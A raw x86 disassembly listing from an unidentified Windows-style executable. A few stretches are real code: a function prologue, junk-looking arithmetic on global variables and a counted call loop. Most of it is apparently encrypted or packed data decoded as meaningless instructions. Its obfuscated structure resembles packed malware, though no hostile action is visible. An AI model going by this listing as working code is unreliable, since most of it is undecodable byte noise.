  4099bc:	sub    ecx,DWORD PTR [esi]
  4099be:	dec    edi
  4099bf:	(bad)  
  4099c0:	xor    al,0x52
  4099c2:	add    DWORD PTR [eax],ecx
  4099c4:	pop    edi
  4099c5:	pop    esi
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fd8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e11c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e297
  4099eb:	mov    edi,DWORD PTR ds:0x42e2a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e79c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e124,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fcf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e11c
  409a3d:	sbb    DWORD PTR ds:0x42e6eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	test   DWORD PTR [edx-0x781a1c3f],0x9f7070ec
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a67
  409a66:	and    eax,DWORD PTR [ebx]
  409a68:	sub    dh,BYTE PTR [edi]
  409a6a:	popf   
  409a6b:	xor    ebp,esp
  409a6d:	mov    edi,0x49fc528f
  409a72:	ret    
  409a73:	mov    bh,0x8f
  409a75:	jo     0x409a6d
  409a77:	bound  ebx,QWORD PTR [esi-0x7d]
  409a7a:	fs ret 0xa7dc
  409a7e:	ret    
  409a7f:	rcr    bh,cl
  409a81:	xchg   BYTE PTR [edx],dh
  409a83:	xchg   BYTE PTR [edx-0x37fe51c5],dl
  409a89:	aas    
  409a8a:	inc    esi
  409a8b:	aam    0xa8
  409a8d:	inc    eax
  409a8e:	fmul   st(5),st
  409a90:	sbb    DWORD PTR [edi+0x178a8ca2],edi
  409a96:	mov    bh,0xe8
  409a98:	(bad)  
  409a99:	xchg   ebx,eax
  409a9a:	sbb    DWORD PTR [eax],0xfc829672
  409aa0:	sbb    edi,DWORD PTR [esi]
  409aa2:	nop
  409aa3:	cmp    eax,0xcc8691ef
  409aa8:	push   edi
  409aa9:	retf   
  409aaa:	fdivr  st(4),st
  409aac:	xor    bh,BYTE PTR [edx+ebx*4-0x5948ffed]
  409ab3:	push   ebp
  409ab4:	pop    ebx
  409ab5:	mov    edx,0x4fe4abcc
  409aba:	jnp    0x409a73
  409abc:	pop    es
  409abd:	mov    WORD PTR [ebp+0x5e],es
  409ac0:	or     ch,bl
  409ac2:	add    eax,ecx
  409ac4:	mov    edi,0xfb31af5f
  409ac9:	mov    ch,0x9e
  409acb:	xchg   edx,eax
  409acc:	xchg   ebx,eax
  409acd:	aaa    
  409ace:	jns    0x409a8a
  409ad0:	jl     0x409b40
  409ad2:	inc    esp
  409ad3:	xchg   edx,eax
  409ad4:	push   cs
  409ad5:	push   ecx
  409ad6:	popf   
  409ad7:	in     al,dx
  409ad8:	pop    edi
  409ad9:	popa   
  409ada:	bound  esi,QWORD PTR ds:0x255e27a5
  409ae0:	push   ebp
  409ae1:	loope  0x409a7b
  409ae3:	addr16 call 0xd6ab:0xf7a929e0
  409aeb:	lods   eax,DWORD PTR ds:[esi]
  409aec:	pusha  
  409aed:	scas   eax,DWORD PTR es:[edi]
  409aee:	adc    al,0x96
  409af0:	shl    cl,1
  409af2:	jle    0x409abe
  409af4:	imul   ebx,DWORD PTR [eax],0x29
  409af7:	inc    ebx
  409af8:	data16 (bad) [ebx+0x73]
  409afc:	push   ecx
  409afd:	imul   ecx,DWORD PTR [ebp-0x6],0x64
  409b01:	xchg   ecx,eax
  409b02:	pop    esi
  409b03:	jbe    0x409a9a
  409b05:	mov    esi,fs
  409b07:	mov    ds:0xd8e931ed,al
  409b0c:	xchg   esp,eax
  409b0d:	and    DWORD PTR [edx],0x15ad8536
  409b13:	jge    0x409b89
  409b15:	mov    ?,WORD PTR [edi-0x53]
  409b18:	xchg   edx,eax
  409b19:	mov    esi,0xc6af3588
  409b1e:	retf   0x1817
  409b21:	stc    
  409b22:	xchg   ebp,eax
  409b23:	dec    edx
  409b24:	aas    
  409b25:	pushf  
  409b26:	sti    
  409b27:	arpl   WORD PTR [ebx+eax*8+0x42a03f4a],cx
  409b2e:	in     eax,0x3b
  409b30:	mov    bh,0xb9
  409b32:	into   
  409b33:	sub    eax,esi
  409b35:	sahf   
  409b36:	mov    cl,0x7a
  409b38:	(bad)  
  409b3a:	mov    eax,0x4b687ab4
  409b3f:	fwait
  409b40:	push   ebp
  409b41:	ins    DWORD PTR es:[edi],dx
  409b42:	add    ecx,DWORD PTR [ebx+ebp*1-0x93a067e]
  409b49:	inc    ecx
  409b4a:	and    esp,eax
  409b4c:	xchg   ebx,eax
  409b4d:	in     eax,dx
  409b4e:	jl     0x409bae
  409b50:	clc    
  409b51:	jge    0x409b32
  409b53:	cmc    
  409b54:	adc    al,BYTE PTR [ebx+eax*2]
  409b57:	mov    cl,0xd6
  409b59:	retf   
  409b5a:	pop    es
  409b5b:	pop    es
  409b5c:	push   0xfd963bea
  409b61:	loope  0x409af0
  409b63:	pop    ecx
  409b64:	xchg   ah,al
  409b66:	scas   al,BYTE PTR es:[edi]
  409b67:	outs   dx,BYTE PTR ds:[esi]
  409b68:	sar    DWORD PTR [eax],cl
  409b6a:	pop    ebx
  409b6b:	jmp    0x409bc3
  409b6d:	lods   al,BYTE PTR ds:[esi]
  409b6e:	and    ebx,esp
  409b70:	pushf  
  409b71:	hlt    
  409b72:	out    dx,al
  409b73:	xchg   ebp,eax
  409b74:	mov    eax,0x39e52810
  409b79:	stc    
  409b7a:	mov    BYTE PTR [eax-0x2d],0xc9
  409b7e:	mov    bl,0x23
  409b80:	sbb    esi,0x4ff74455
  409b86:	jmp    0x409bc2
  409b88:	dec    esp
  409b89:	dec    ecx
  409b8a:	pop    edi
  409b8b:	pop    es
  409b8c:	in     al,0x47
  409b8e:	pop    edx
  409b8f:	das    
  409b90:	xchg   edi,eax
  409b91:	icebp  
  409b92:	xor    ecx,ecx
  409b94:	dec    ebp
  409b95:	pop    ss
  409b96:	outs   dx,DWORD PTR ds:[esi]
  409b97:	cmp    esi,DWORD PTR [eax]
  409b99:	dec    esp
  409b9a:	lods   eax,DWORD PTR ds:[esi]
  409b9b:	pop    ecx
  409b9c:	mov    esi,0x4e98f3a8
  409ba1:	ret    
  409ba2:	stc    
  409ba3:	pop    es
  409ba4:	ja     0x409c11
  409ba6:	imul   edi,DWORD PTR [edi+0x4aaf9a2b],0x2f4c2d3c
  409bb0:	cs push ds
  409bb2:	out    0xd9,eax
  409bb4:	into   
  409bb5:	sbb    edi,DWORD PTR gs:[eax-0x58]
  409bb9:	ret    
  409bba:	jno    0x409bf2
  409bbc:	test   al,0x9d
  409bbe:	enter  0xa27c,0xb0
  409bc2:	outs   dx,BYTE PTR ds:[esi]
  409bc3:	pop    es
  409bc4:	dec    ebp
  409bc5:	mov    bl,0x65
  409bc7:	xchg   esi,eax
  409bc8:	out    0xab,al
  409bca:	daa    
  409bcb:	mov    edi,0x2a50a9b5
  409bd0:	adc    eax,0xbc3cc00f
  409bd5:	cmp    eax,0xb1ee9324
  409bda:	add    al,0xdf
  409bdc:	inc    DWORD PTR [ecx+ebx*1-0x5bf30dcd]
  409be3:	push   ebp
  409be4:	push   0xfffffff0
  409be6:	pop    esp
  409be7:	test   DWORD PTR [ecx-0x6a],esp
  409bea:	cli    
  409beb:	(bad)  
  409bec:	lods   eax,DWORD PTR ds:[esi]
  409bed:	icebp  
  409bee:	hlt    
  409bef:	lods   eax,DWORD PTR ds:[esi]
  409bf0:	jne    0x409b96
  409bf2:	or     eax,0xf5d43e5
  409bf7:	jb     0x409bee
  409bf9:	fldcw  WORD PTR [ebx+0x4a]
  409bfc:	in     eax,0xac
  409bfe:	imul   edx,DWORD PTR [eax+0x22],0x60015877
  409c05:	mov    edx,0x353c2994
  409c0a:	cli    
  409c0b:	fwait
  409c0c:	scas   al,BYTE PTR es:[edi]
  409c0d:	inc    eax
  409c0e:	pop    ebp
  409c0f:	mov    eax,gs:0x1b9b88e5
  409c15:	movnti DWORD PTR [edx-0x77ab2bfd],esi
  409c1c:	rcl    DWORD PTR [ebp+0x21],0x90
  409c20:	xor    al,0x69
  409c22:	gs in  eax,0xcb
  409c25:	ds iret 
  409c27:	xchg   ebx,eax
  409c28:	ins    DWORD PTR es:[edi],dx
  409c29:	fisttp DWORD PTR [eax+ebx*2+0x659ed73a]
  409c30:	es cmp al,0xc0
  409c33:	stos   BYTE PTR es:[edi],al
  409c34:	cmp    al,al
  409c36:	dec    edx
  409c37:	jno    0x409c16
  409c39:	push   ds
  409c3a:	arpl   sp,ax
  409c3c:	pop    ss
  409c3d:	adc    DWORD PTR [ecx],esi
  409c3f:	(bad)  
  409c41:	mov    eax,0x96ced33a
  409c46:	and    eax,0x15d4ed1
  409c4b:	dec    ebp
  409c4c:	mov    ecx,0xe4dab762
  409c51:	pop    edi
  409c52:	mov    esp,cs
  409c54:	fisttp DWORD PTR [edx+ebx*8]
  409c57:	sub    edx,DWORD PTR [eax-0x39b97efb]
  409c5d:	div    BYTE PTR ds:0x41a59adc
  409c63:	sub    edx,ebx
  409c65:	mov    ecx,0x994c172b
  409c6a:	xchg   BYTE PTR [ecx],dl
  409c6c:	(bad)  
  409c6d:	dec    eax
  409c6e:	adc    BYTE PTR [ebp+0x1b],al
  409c71:	loopne 0x409c85
  409c73:	xchg   esp,eax
  409c74:	adc    eax,0x61b48132
  409c79:	xor    al,BYTE PTR [eax-0x33cf6ba1]
  409c7f:	mov    bl,0xb5
  409c81:	pop    ebx
  409c82:	sub    eax,0xbd1eb1a
  409c87:	add    bl,BYTE PTR [edx-0x15]
  409c8a:	or     BYTE PTR [ebx+0x32325386],0x39
  409c91:	xchg   esp,eax
  409c92:	clc    
  409c93:	push   ds
  409c94:	int    0xa8
  409c96:	mov    ebx,0xf6b6ffc1
  409c9b:	inc    edx
  409c9c:	ret    0xacf
  409c9f:	ds inc esi
  409ca1:	jb     0x409c69
  409ca3:	inc    esi
  409ca4:	cwde   
  409ca5:	(bad)  
  409ca6:	sub    DWORD PTR [eax],eax
  409ca8:	sbb    eax,0xc201f3c1
  409cad:	push   esp
  409cae:	(bad)
  409cb1:	sbb    DWORD PTR [esi-0x1d09a823],ecx
  409cb7:	mov    al,0x1b
  409cb9:	es stos DWORD PTR es:[edi],eax
  409cbb:	inc    edi
  409cbc:	aas    
  409cbd:	jno    0x409ce5
  409cbf:	xchg   edx,eax
  409cc0:	cmp    DWORD PTR [ebx],eax
  409cc2:	jg     0x409d0a
  409cc4:	adc    ch,ah
  409cc6:	or     BYTE PTR [eax],bl
  409cc8:	adc    ah,BYTE PTR [esi+0xb21a6b2]
  409cce:	jb     0x409c7b
  409cd0:	int3   
  409cd1:	outs   dx,WORD PTR ds:[esi]
  409cd3:	lods   al,BYTE PTR ds:[esi]
  409cd4:	mov    esi,DWORD PTR [edx+0x11e688eb]
  409cda:	mov    esi,0x4c850918
  409cdf:	sub    ebx,ecx
  409ce1:	fcomp  QWORD PTR [eax+0x5a]
  409ce4:	neg    DWORD PTR [eax+0x654fb8f3]
  409cea:	mov    al,ds:0x20a509e8
  409cef:	mov    DWORD PTR [eax-0x61],edi
  409cf2:	stos   BYTE PTR es:[edi],al
  409cf3:	push   ds
  409cf4:	mov    bh,0x31
  409cf6:	retf   
  409cf7:	jl     0x409d12
  409cf9:	mov    ah,0x10
  409cfb:	adc    ah,BYTE PTR [esi-0x65]
  409cfe:	jb     0x409cd8
  409d00:	push   edx
  409d01:	xchg   ebx,eax
  409d02:	nop
  409d03:	enter  0x4081,0x4d
  409d07:	or     DWORD PTR [ebp-0x63ed7e82],esp
  409d0d:	push   ebp
  409d0e:	and    edx,DWORD PTR [edx-0x1d]
  409d11:	addr16 adc edx,eax
  409d14:	stc    
  409d15:	xchg   edi,eax
  409d16:	ins    DWORD PTR es:[edi],dx
  409d17:	imul   ebx,DWORD PTR [eax+eiz*4],0xffffffe8
  409d1b:	cli    
  409d1c:	cmp    DWORD PTR [esi+0x3b],ecx
  409d1f:	push   cs
  409d20:	adc    DWORD PTR [edx-0x3e],eax
  409d23:	sbb    BYTE PTR [edx+0x48],bh
  409d26:	out    0x50,eax
  409d28:	loop   0x409cd7
  409d2a:	ja     0x409d2c
  409d2c:	outs   dx,BYTE PTR ds:[esi]
  409d2d:	and    BYTE PTR [ecx],cl
  409d2f:	ss pusha 
  409d31:	scas   al,BYTE PTR es:[edi]
  409d32:	cld    
  409d33:	out    dx,al
  409d34:	mov    edi,0xd1959df8
  409d39:	mov    al,0x79
  409d3b:	jp     0x409d9b
  409d3d:	mov    ch,BYTE PTR [ecx-0x64dfac8d]
  409d43:	jo     0x409d37
  409d45:	scas   al,BYTE PTR es:[edi]
  409d46:	mov    ds:0x6263fa8e,eax
  409d4b:	daa    
  409d4c:	sbb    al,0xe4
  409d4e:	mov    esp,0x89f7e217
  409d53:	(bad)  
  409d54:	lods   al,BYTE PTR ds:[esi]
  409d55:	fimul  DWORD PTR [ecx-0x31]
  409d58:	into   
  409d59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d5a:	push   ebx
  409d5b:	scas   eax,DWORD PTR es:[edi]
  409d5c:	out    dx,eax
  409d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d5e:	xchg   edi,eax
  409d5f:	sbb    cl,BYTE PTR [esi+0x58]
  409d62:	or     edi,ebx
  409d64:	cld    
  409d65:	or     ah,cl
  409d67:	and    eax,0x2b578350
  409d6c:	int    0x9b
  409d6e:	(bad)  [ebx+0x2c]
  409d71:	xchg   esi,eax
  409d72:	cmp    DWORD PTR [ebx+ebx*8+0x5565fc9b],esi
  409d79:	cwde   
  409d7a:	addr16 adc dh,bh
  409d7d:	pop    edx
  409d7e:	cmp    DWORD PTR [ebp+0xd],eax
  409d81:	into   
  409d82:	mov    fs,esp
  409d84:	sbb    eax,0xfd3881e7
  409d89:	out    0xd,eax
  409d8b:	das    
  409d8c:	jle    0x409d79
  409d8e:	lds    edx,FWORD PTR [bp+si-0x62c5]
  409d93:	cmp    dh,BYTE PTR [eax+eiz*8+0x64c473bb]
  409d9a:	sub    DWORD PTR [ebx+eiz*8+0x4d7b6699],edx
  409da1:	arpl   bx,sp
  409da3:	call   0x622a:0x9bc9cab5
  409daa:	out    dx,al
  409dab:	loopne 0x409d48
  409dad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dae:	adc    BYTE PTR ds:0x3df42347,ch
  409db4:	push   eax
  409db5:	jp     0x409d9c
  409db7:	sub    eax,0x3b414f92
  409dbc:	dec    eax
  409dbd:	into   
  409dbe:	les    eax,FWORD PTR [edi-0x290bc595]
  409dc4:	ss es mov esp,ebx
  409dc8:	imul   esi,DWORD PTR [esi+0x29],0xffffffe5
  409dcc:	mov    ch,0xcc
  409dce:	jns    0x409e01
  409dd0:	inc    ebp
  409dd1:	push   esp
  409dd2:	iret   
  409dd3:	mov    gs,WORD PTR [edx+edx*8]
  409dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dd7:	mov    al,ds:0x87775adf
  409ddc:	xchg   ecx,eax
  409ddd:	inc    ebx
  409dde:	lahf   
  409ddf:	clc    
  409de0:	xor    edi,DWORD PTR [ebx+ebx*4-0x41]
  409de4:	jp     0x409d82
  409de6:	std    
  409de7:	(bad)  
  409de8:	jge    0x409e5b
  409dea:	repnz outs dx,BYTE PTR ds:[esi]
  409dec:	inc    ebp
  409ded:	arpl   WORD PTR [edi],bx
  409def:	dec    esi
  409df0:	mov    eax,0x97e6ef5c
  409df5:	scas   eax,DWORD PTR es:[edi]
  409df6:	dec    eax
  409df7:	out    dx,eax
  409df8:	mov    DWORD PTR [edi+ebx*1+0x42],ebx
  409dfc:	mov    cl,0xf7
  409dfe:	cmp    ecx,DWORD PTR [edi+0x4590b4e3]
  409e04:	lods   al,BYTE PTR ds:[esi]
  409e05:	repnz add edx,ecx
  409e08:	xor    DWORD PTR ds:0x42fd8a,ecx
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fcf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e124
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fd82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fd82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fd82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e2e3
  409e51:	mov    edi,DWORD PTR ds:0x42fd82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fd82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e703,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	mov    DWORD PTR [ebx+0x2687ab6a],0x9f7070e8
  409e8a:	jge    0x409efc
  409e8c:	jo     0x409eaf
  409e8e:	xchg   al,al
  409e90:	mov    dh,0x8f
  409e92:	jno    0x409e55
  409e94:	fdivrp st(5),st
  409e96:	fsubr  st,st(0)
  409e98:	or     ebx,0x787d8c70
  409e9e:	stos   BYTE PTR es:[edi],al
  409e9f:	sub    ah,BYTE PTR [ecx+eax*8]
  409ea2:	mov    ebx,0x4091f73
  409ea7:	adc    al,BYTE PTR [ecx+eax*2+0x28dfefb5]
  409eae:	jp     0x409e79
  409eb0:	sar    esi,cl
  409eb2:	sbb    edi,DWORD PTR [esi]
  409eb4:	pop    esp
  409eb5:	mov    ecx,0x3d202c7
  409eba:	pop    ebx
  409ebb:	or     BYTE PTR [eax+0x21],ch
  409ebe:	xor    al,dh
  409ec0:	sub    eax,0xfdcf83a6
  409ec5:	in     eax,0xdc
  409ec7:	in     al,0x6e
  409ec9:	mov    dl,0x87
  409ecb:	fcomp  DWORD PTR [eax]
  409ecd:	sub    ecx,DWORD PTR [eax-0x1d]
  409ed0:	int    0x80
  409ed2:	jb     0x409e77
  409ed4:	pop    ecx
  409ed5:	ror    eax,1
  409ed7:	pushf  
  409ed8:	push   ebp
  409ed9:	jns    0x409f07
  409edb:	adc    ebp,DWORD PTR [ebx]
  409edd:	out    0x29,al
  409edf:	dec    ecx
  409ee0:	jmp    0x409f1f
  409ee2:	add    dh,ah
  409ee4:	jmp    0x409ee3
  409ee6:	aad    0x16
  409ee8:	aaa    
  409ee9:	mov    ?,WORD PTR [esi+ebx*1+0x5a746475]
  409ef0:	xchg   edi,eax
  409ef1:	jg     0x409f61
  409ef3:	push   0x7d
  409ef5:	sbb    ecx,DWORD PTR [eax+0x2d3bda9b]
  409efb:	stc    
  409efc:	mov    WORD PTR [edx+0x445c4350],cs
  409f02:	jl     0x409f1d
  409f04:	sbb    BYTE PTR [edx-0x80b4349],cl
  409f0a:	mov    ah,0x92
  409f0c:	lds    esp,FWORD PTR [ebx+0x40]
  409f0f:	xchg   edi,eax
  409f10:	xor    BYTE PTR [eax+0x75],0x80
  409f14:	sub    ch,BYTE PTR [edx+0x4a]
  409f17:	push   ebp
  409f18:	outs   dx,DWORD PTR ds:[esi]
  409f19:	in     eax,dx
  409f1a:	jmp    0x409f87
  409f1c:	(bad)  
  409f1d:	lods   eax,DWORD PTR ds:[esi]
  409f1e:	dec    ebx
  409f1f:	stc    
  409f20:	xor    BYTE PTR [edx],ch
  409f22:	adc    al,0x86
  409f24:	ja     0x409f55
  409f26:	sbb    DWORD PTR [esi],ebx
  409f28:	sub    BYTE PTR [ebx],cl
  409f2a:	add    eax,0x7048c0ad
  409f2f:	add    dl,BYTE PTR [eax-0x33d38caf]
  409f35:	pop    ebp
  409f36:	test   eax,0x11d17ae4
  409f3b:	xor    al,0x9a
  409f3d:	pop    eax
  409f3e:	call   0x328b0ee
  409f43:	mov    dh,BYTE PTR [esi+0x60aeb156]
  409f49:	mov    ch,0x21
  409f4b:	push   ds
  409f4c:	mov    ebx,0x9b7ba9bf
  409f51:	jle    0x409ed4
  409f53:	cmp    al,0xcf
  409f55:	jmp    0xd23d96f1
  409f5a:	jl     0x409f7f
  409f5c:	inc    edi
  409f5d:	pop    ss
  409f5e:	push   esp
  409f5f:	pusha  
  409f60:	data16 out 0x44,al
  409f63:	add    edi,DWORD PTR [edx-0x7f]
  409f66:	mul    ebp
  409f68:	fsubr  DWORD PTR [edi]
  409f6a:	add    eax,0xfbb07e1b
  409f6f:	pushf  
  409f70:	aad    0xbd
  409f72:	out    0x4c,al
  409f74:	hlt    
  409f75:	dec    esi
  409f76:	sbb    al,ch
  409f78:	pop    es
  409f79:	mov    edi,0x8e730126
  409f7e:	add    ecx,DWORD PTR [ebx]
  409f80:	sub    al,0x3d
  409f82:	push   ebp
  409f83:	pushf  
  409f84:	dec    esp
  409f85:	xchg   ebx,eax
  409f86:	mov    eax,0xf10799f8
  409f8b:	mov    cl,0xc
  409f8d:	mov    bl,0xbc
  409f8f:	shr    DWORD PTR [ebp-0x27],1
  409f92:	ficomp DWORD PTR [esi-0xb]
  409f95:	or     eax,0x796534bf
  409f9a:	or     esp,DWORD PTR [esp+edi*1]
  409f9d:	mov    cl,0x27
  409f9f:	gs mov bh,0x65
  409fa2:	ins    DWORD PTR es:[edi],dx
  409fa3:	xor    ebx,0xcb5d752e
  409fa9:	inc    edx
  409faa:	cli    
  409fab:	push   0x24fab82e
  409fb0:	push   cs
  409fb1:	jns    0x409f91
  409fb3:	inc    ebx
  409fb4:	mov    ebp,0xe0792b8b
  409fb9:	add    edx,DWORD PTR [esi-0x513675d9]
  409fbf:	jne    0x409fe3
  409fc1:	fcomp  QWORD PTR [edx+0x103b4952]
  409fc7:	jle    0x40a024
  409fc9:	popf   
  409fca:	inc    ebp
  409fcb:	jge    0x409fb2
  409fcd:	enter  0xe419,0xf3
  409fd1:	jl     0x409fa2
  409fd3:	jle    0x409fff
  409fd5:	js     0x409f7b
  409fd7:	mov    ch,0xb4
  409fd9:	sub    dl,bh
  409fdb:	add    eax,0x5d45fdf1
  409fe0:	mov    gs,WORD PTR [edi+ebx*8+0x54dd2677]
  409fe7:	loopne 0x40a018
  409fe9:	loop   0x40a01f
  409feb:	and    DWORD PTR ds:0x756e7f7f,ecx
  409ff1:	pop    ecx
  409ff2:	mov    DWORD PTR [eax+edi*8-0x796d3ea6],edx
  409ff9:	ins    DWORD PTR es:[edi],dx
  409ffa:	xchg   ecx,eax
  409ffb:	clc    
  409ffc:	xor    DWORD PTR [ecx],eax
  409ffe:	sub    ah,dl
  40a000:	repz jp 0x40a017
  40a003:	xor    BYTE PTR [ebx+ecx*8-0x77324830],al
  40a00a:	fcmovb st,st(4)
  40a00c:	hlt    
  40a00d:	inc    eax
  40a00e:	mov    ebx,0x17841f36
  40a013:	fistp  WORD PTR [ebx-0x39b817c0]
  40a019:	push   esi
  40a01a:	mov    ecx,0x1718c040
  40a01f:	in     eax,dx
  40a020:	jb     0x409fd9
  40a022:	adc    ebp,ebx
  40a024:	sub    DWORD PTR [ebx],ebp
  40a026:	mov    ebx,0xe0948689
  40a02b:	pop    eax
  40a02c:	js     0x409ffa
  40a02e:	jno    0x40a0a5
  40a030:	repnz xlat BYTE PTR ds:[ebx]
  40a032:	push   ss
  40a033:	jns    0x409ff6
  40a035:	and    al,0xad
  40a037:	mov    ebp,0x31b87ec5
  40a03c:	push   ebx
  40a03d:	push   esi
  40a03e:	jmp    0x879ce816
  40a043:	jno    0x40a023
  40a045:	out    0xdf,al
  40a047:	jb     0x40a038
  40a049:	inc    esp
  40a04a:	(bad)  [edx+0xd3af5d0]
  40a050:	cmp    al,BYTE PTR [eax]
  40a052:	push   edx
  40a053:	(bad)  
  40a054:	jle    0x409fe6
  40a056:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a057:	popf   
  40a058:	mov    ds:0x897c59b0,al
  40a05d:	push   0x18ee7711
  40a062:	nop
  40a063:	out    dx,eax
  40a064:	adc    BYTE PTR [edx+0xf9da7ba],al
  40a06a:	mov    cl,0xba
  40a06c:	(bad)  
  40a06d:	dec    esi
  40a06e:	dec    ebx
  40a06f:	arpl   WORD PTR [esi],sp
  40a071:	xlat   BYTE PTR ds:[ebx]
  40a072:	mov    ?,WORD PTR [ebx+0x4d]
  40a075:	std    
  40a076:	inc    ecx
  40a077:	adc    BYTE PTR [edi],cl
  40a079:	dec    edi
  40a07a:	sti    
  40a07b:	loopne 0x40a03e
  40a07d:	pop    es
  40a07e:	lods   al,BYTE PTR ds:[esi]
  40a07f:	stc    
  40a080:	and    eax,0x29e86595
  40a085:	and    DWORD PTR [edi+edx*8-0x4e9de882],ebx
  40a08c:	sbb    eax,0x34e8c294
  40a091:	cmp    DWORD PTR ds:0x44196a59,eax
  40a097:	push   esp
  40a098:	(bad)  
  40a099:	test   esp,0x9be92251
  40a09f:	cmp    DWORD PTR [ebx],0xffffffaa
  40a0a2:	and    eax,0x8691aa4d
  40a0a7:	and    DWORD PTR [ebp+0x20],ebx
  40a0aa:	rol    eax,0xa8
  40a0ad:	lahf   
  40a0ae:	out    dx,eax
  40a0af:	or     dh,BYTE PTR [edi+edi*4+0x71c9b98e]
  40a0b6:	fiadd  WORD PTR [eax-0x35]
  40a0b9:	add    al,0x8d
  40a0bb:	xor    DWORD PTR [ebx+esi*4+0x5d],esp
  40a0bf:	aad    0x54
  40a0c1:	xor    al,0xa3
  40a0c3:	inc    ebx
  40a0c4:	std    
  40a0c5:	dec    DWORD PTR [esp+esi*2+0x9]
  40a0c9:	test   al,0x12
  40a0cb:	data16 jbe 0x40a0f5
  40a0ce:	dec    ebx
  40a0cf:	loop   0x40a11e
  40a0d1:	daa    
  40a0d2:	sti    
  40a0d3:	jle    0x40a065
  40a0d5:	mov    dl,0xa6
  40a0d7:	pushf  
  40a0d8:	bound  ecx,QWORD PTR [ebx-0x319b3d8a]
  40a0de:	or     al,0x10
  40a0e0:	pushf  
  40a0e1:	cwde   
  40a0e2:	jo     0x40a0bf
  40a0e4:	les    edx,FWORD PTR [edi]
  40a0e6:	sbb    esp,eax
  40a0e8:	shl    BYTE PTR [edx+0xb6137da],cl
  40a0ee:	mov    ch,BYTE PTR [eax+0x74]
  40a0f1:	(bad)  
  40a0f2:	jmp    0x979e5db2
  40a0f7:	je     0x40a0d4
  40a0f9:	mov    eax,ds:0x1eb480e0
  40a0fe:	ffree  st(7)
  40a100:	cli    
  40a101:	imul   ebx,DWORD PTR [ebx+0x5f],0x526215ba
  40a108:	(bad)  
  40a109:	sub    BYTE PTR [ecx],bl
  40a10b:	push   0xc7695f2f
  40a110:	xor    eax,0xe8718a11
  40a115:	stos   DWORD PTR es:[edi],eax
  40a116:	popa   
  40a117:	icebp  
  40a118:	js     0xf35df1d5
  40a11e:	xor    eax,0x6a5166bd
  40a123:	cmp    ah,BYTE PTR [edx-0x59]
  40a126:	mov    DWORD PTR [edi-0x234b6d9e],0xc0fdb778
  40a130:	push   esp
  40a131:	test   BYTE PTR [esi],cl
  40a133:	jne    0x40a155
  40a135:	test   eax,0xb3df3029
  40a13a:	dec    ecx
  40a13b:	jns    0x40a17b
  40a13d:	add    bh,al
  40a13f:	hlt    
  40a140:	sbb    BYTE PTR [edi],dh
  40a142:	mov    cl,0xb8
  40a144:	inc    esi
  40a145:	jmp    0x40a13c
  40a147:	shr    BYTE PTR [eax],1
  40a149:	cmp    BYTE PTR [eax+0x3a5cb97d],0x5
  40a150:	cmp    ebx,ecx
  40a152:	int3   
  40a153:	ret    
  40a154:	adc    edx,DWORD PTR [edx]
  40a156:	outs   dx,DWORD PTR ds:[esi]
  40a157:	add    al,0xb7
  40a159:	jbe    0x40a0e3
  40a15b:	(bad)  
  40a15c:	fmul   QWORD PTR [ebp+0x5b]
  40a15f:	inc    ebp
  40a160:	inc    ecx
  40a161:	icebp  
  40a162:	cmp    BYTE PTR [eax+0x6d],ch
  40a165:	(bad)  [ebp+0x3d]
  40a168:	test   BYTE PTR [ecx],dh
  40a16a:	sub    BYTE PTR [ebx],cl
  40a16c:	xchg   cl,dl
  40a16e:	jne    0x40a165
  40a170:	mov    DWORD PTR ds:0x2a5e0d31,esi
  40a176:	aas    
  40a177:	xchg   ecx,eax
  40a179:	test   DWORD PTR [edi],0x3419591e
  40a17f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a180:	pop    esi
